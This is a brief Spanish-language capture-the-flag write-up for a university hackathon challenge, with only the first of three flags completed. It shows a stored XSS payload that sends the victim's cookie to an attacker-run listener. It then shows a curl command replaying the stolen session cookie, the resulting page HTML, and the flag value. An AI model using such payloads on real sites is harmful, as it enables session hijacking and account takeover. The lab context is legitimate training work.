# Hackaton UdG - Reto 3

## Index

- [Flag 1](#flag-1)

- [Flag 2](#flag-2)

- [Flag 3](#flag-3)

### Flag 1 

Creamos un usuario, levantamos un servidor en python con `python -m ` dentro de los upload, en el apartado de texto plano alguno de los siguientes XSS


```html
<img src=x onerror="document.location='http://10.0.2.15:6969/cookie?data='+document.cookie;">

```
```shell
                                                                            
curl -b "NOTESAPP=29260242|asmith||author" http://10.0.2.12/notesapp/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Notes: Home</title>
<style>
...
...
  </span>
  <span id='menu-right'>
      
      <span class='menu-user'>
        Alice Smith &lt;asmith&gt;
      </span>
      
      | <a href='/notesapp/editprofile.tpl'>Profile</a>
      | <a href='/notesapp/logout'>Close session</a>
      
      
  </span>
</div>

<div>
<h2 class='has-refresh'>Notes: Home</h2>
<div class='refresh'><a class='button' onclick='_refreshHome("notesapp")' href='#'>Refresh</a></div>
</div>
<div class='content'>
<table width='100%'>

  <tr>
    <td></td>
    <td>
      Private&nbsp;note&nbsp;
    </td>
    <td>
      <a class='button' id='show' onclick='_showHide("show", "hide")' href='#'>Show &#9658;</a>
      <span id='hide' style='display: none;'>
      <a class='button' onclick='_showHide("show", "hide")' href='#'>Hide &#9668;</a> &nbsp;
      <span id='private_note'>HACK{jckauGfFL5Xl2ovCTfR7sAaWAgAkHZx4SnC1n2Q6fvo}</span></span>
    </td>
  </tr>
  <tr><td colspan='3'><hr></td></tr>

  <tr><td colspan='3'><b>Most recent notes:</b></td></tr>




  <tr>
    <td>
     
    </td>
    <td>
      <b><span style='color:orange'>Alice Smith</span></b>
    </td>
    <td width='100%'><span id='asmith'>Welcome to our shared notes platform!</span>
    <br>
          <a href='/notesapp/notes.tpl?uid=asmith'>All notes</a>&nbsp;
      <a href='#'>Homepage</a>
    <br>
    <br>
    </td>
  </tr>



  <tr>
    <td>
     
    </td>
    <td>
      <b><span style='color:blue'>John Doe</span></b>
    </td>
    <td width='100%'><span id='jdoe'>I'm working on a new project and looking for collaborators!</span>
    <br>
          <a href='/notesapp/notes.tpl?uid=jdoe'>All notes</a>&nbsp;
      <a href='#'>Homepage</a>
    <br>
    <br>
    </td>
  </tr>



  <tr>
    <td>
     
    </td>
    <td>
      <b><span style='color:red; text-decoration:underline'>Michael Brown</span></b>
    </td>
    <td width='100%'><span id='mbrown'>An inspiring quote for the day: "Knowledge grows when shared."Still learning, but happy to share my knowledge!</span>
    <br>
          <a href='/notesapp/notes.tpl?uid=mbrown'>All notes</a>&nbsp;
      <a href='#'>Homepage</a>
    <br>
    <br>
    </td>
  </tr>


</table>
</div>
</body>
</html>
```

**Flag 1:** `HACK{jckauGfFL5Xl2ovCTfR7sAaWAgAkHZx4SnC1n2Q6fvo}`


### Flag 2 


### Flag 3


